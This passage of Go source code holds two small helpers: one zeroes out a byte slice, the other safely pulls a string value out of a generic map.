func zeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

// getString safely extracts a string from a map[string]interface{}.
func getString(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}
